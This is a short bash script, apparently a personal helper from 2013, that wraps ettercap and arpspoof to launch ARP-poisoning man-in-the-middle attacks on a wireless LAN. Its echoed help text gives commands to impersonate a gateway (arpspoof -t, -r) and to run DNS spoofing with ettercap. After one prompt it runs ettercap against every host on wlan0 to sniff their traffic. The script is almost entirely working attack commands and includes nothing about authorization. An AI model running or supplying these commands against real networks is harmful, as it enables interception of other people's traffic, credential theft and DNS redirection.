#!/bin/bash -
#use ettercap to arp sniff.
#
#by needle wang
#2013年 10月 21日 星期一 18:54:58 CST

#arpspoof need ip_forward, ettercap not.
#if [ ! "$(cat /proc/sys/net/ipv4/ip_forward)" -eq "1" ]
#then
	#echo 'if arp poison, need open ip_forward.'
	#echo 1 > /proc/sys/net/ipv4/ip_forward && echo 'open done.'
#fi

echo "
arpspoof usage:
arpspoof -i wlan0 -t 192.168.1.5 192.168.1.1
means: arpspoof tell 1.5 that I'm 1.1.
-r is MITM, or with exchanging both IP, run it again.

dns spoof is:
ettercap -T -q -M arp:remote -P dns_spoof //

"

echo 'here is running: ettercap -T -i wlan0 -M arp:remote // //'
answer="Y"
read -p 'sniff all pc with ettercap using wlan0?[Y|n] ' answer
if [ "${answer}" == "Y" ]
then
	ettercap -T -i wlan0 -M arp:remote // //
fi

